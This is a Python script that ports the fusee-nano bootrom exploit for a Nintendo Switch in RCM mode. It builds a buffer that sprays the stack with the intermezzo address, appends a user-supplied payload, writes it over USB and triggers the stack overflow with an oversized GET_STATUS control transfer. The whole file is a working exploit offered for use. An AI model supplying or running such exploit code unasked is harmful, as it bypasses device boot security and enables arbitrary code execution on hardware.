import usb.core
import usb.util
import struct
import os
import sys
import time

# USB IDs for Nintendo Switch in RCM mode
RCM_VID = 0x0955
RCM_PID = 0x7321

# Path to intermezzo binary relative to this file
INTERMEZZO_REL_PATH = "fusee-nano/files/intermezzo.bin"

# Constants from fusee-nano exploit.c
MAX_LENGTH = 0x30298
RCM_PAYLOAD_ADDR = 0x40010000
INTERMEZZO_LOCATION = 0x4001F000
PAYLOAD_LOAD_BLOCK = 0x40020000
SEND_CHUNK_SIZE = 0x1000

def inject(payload_path):
    """
    Injects a payload into a Nintendo Switch in RCM mode.
    Replicates the logic of fusee-nano/exploit.c in pure Python.
    """
    
    # 1. Locate and read intermezzo.bin
    base_dir = os.path.dirname(os.path.abspath(__file__))
    intermezzo_path = os.path.join(base_dir, INTERMEZZO_REL_PATH)
    
    if not os.path.exists(intermezzo_path):
        raise FileNotFoundError(f"Intermezzo binary not found at {intermezzo_path}")
        
    with open(intermezzo_path, "rb") as f:
        intermezzo = f.read()
        
    # 2. Read the actual payload
    if not os.path.exists(payload_path):
        raise FileNotFoundError(f"Payload not found at {payload_path}")

    with open(payload_path, "rb") as f:
        payload = f.read()

    # 3. Find the USB device
    dev = usb.core.find(idVendor=RCM_VID, idProduct=RCM_PID)
    if dev is None:
        raise RuntimeError("Switch in RCM mode not found. Check USB connection.")

    # 4. Prepare Device (Linux specific mostly)
    try:
        if dev.is_kernel_driver_active(0):
            dev.detach_kernel_driver(0)
    except Exception as e:
        # Ignore on Windows or if fails, proceed and hope for the best
        pass

    # 5. Construct the exploitation buffer
    # The buffer size must be exactly MAX_LENGTH for the construction logic
    buf = bytearray(MAX_LENGTH)
    
    # Write Length (4 bytes) at offset 0
    struct.pack_into("<I", buf, 0, MAX_LENGTH)
    
    # payload_idx starts at 680 (skipping header/padding)
    payload_idx = 680
    
    # Fill stack with intermezzo address
    # Range: from RCM_PAYLOAD_ADDR to INTERMEZZO_LOCATION
    fill_len = INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR
    intermezzo_addr_bytes = struct.pack("<I", INTERMEZZO_LOCATION)
    
    # Pythonic fill
    buf[payload_idx : payload_idx + fill_len] = intermezzo_addr_bytes * (fill_len // 4)
    payload_idx += fill_len
    
    # Copy intermezzo code
    buf[payload_idx : payload_idx + len(intermezzo)] = intermezzo
    
    # Pad until payload load block
    # fusee-nano: payload_idx += PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION;
    payload_idx += (PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION)
    
    # Copy actual payload
    remaining_space = MAX_LENGTH - payload_idx
    if len(payload) > remaining_space:
        print(f"Warning: Payload is too large ({len(payload)} bytes), truncating to {remaining_space} bytes.")
        payload = payload[:remaining_space]
        
    buf[payload_idx : payload_idx + len(payload)] = payload
    payload_idx += len(payload)
    
    # 6. Send the payload via Endpoint 1
    # We must send in chunks of SEND_CHUNK_SIZE (0x1000)
    # We must continue until all data is sent OR 'low_buffer' logic is satisfied
    # fusee-nano logic: for (idx=0; idx < payload_len || low_buffer; ...)
    
    total_len_to_send = payload_idx
    current_idx = 0
    low_buffer = True # Starts true
    
    # Use the endpoint 1 (OUT)
    ep_out = 0x01
    
    while current_idx < total_len_to_send or low_buffer:
        # Get chunk
        chunk = buf[current_idx : current_idx + SEND_CHUNK_SIZE]
        
        # Pad with zeros if we are past the buffer end but need to send to satisfy low_buffer
        if len(chunk) < SEND_CHUNK_SIZE:
             padding_needed = SEND_CHUNK_SIZE - len(chunk)
             chunk += b'\x00' * padding_needed
             
        try:
            dev.write(ep_out, chunk, 1000)
        except usb.core.USBError as e:
            raise RuntimeError(f"USB Write Error at offset {current_idx}: {e}")
        
        current_idx += SEND_CHUNK_SIZE
        low_buffer = not low_buffer # Toggle
        
    # 7. Trigger the exploit
    # Send a Control Transfer with Length 0x7000 to smash the stack
    try:
        # standard fusee-launcher trigger
        # Request Type: 0x82 (Device-to-Host | Standard | Endpoint)
        # Request: 0 (GET_STATUS)
        # Value: 0
        # Index: 0
        # Length: 0x7000
        dev.ctrl_transfer(0x82, 0, 0, 0, 0x7000)
    except usb.core.USBError:
        # It is expected that this fails because the device crashes/reloads immediately
        pass

    return True

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <payload.bin>")
        sys.exit(1)
        
    try:
        inject(sys.argv[1])
        print("Payload injected successfully!")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
